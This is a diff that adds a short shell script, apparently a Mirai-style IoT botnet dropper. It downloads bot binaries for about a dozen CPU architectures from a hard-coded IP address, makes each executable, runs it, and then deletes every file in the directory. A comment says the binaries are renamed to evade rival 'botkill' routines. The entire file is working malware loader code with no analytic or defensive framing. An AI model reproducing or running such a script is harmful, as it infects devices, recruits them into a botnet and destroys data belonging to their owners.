@@ -1,0 +1,17 @@
+#!/bin/sh
+
+# Edit
+WEBSERVER="95.46.44.13:80"
+# Stop editing now
+
+#rename these to prevent botkill
+BINARIES="tnxl.arm5 tnxl.arm6 tnxl.arm7 tnxl.arm tnxl.mk68k tnxl.mips tnxl.mpsl tnxl.ppc tnxl.sh4 tnxl.x86 tnxl.spc"
+#BINARIES="mirai.arm mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.x86 mirai.spc"
+
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/Binarys/$Binary -O TNXLKD
+    chmod 777 TNXLKD 
+    ./TNXLKD 
+done
+
+rm -f *
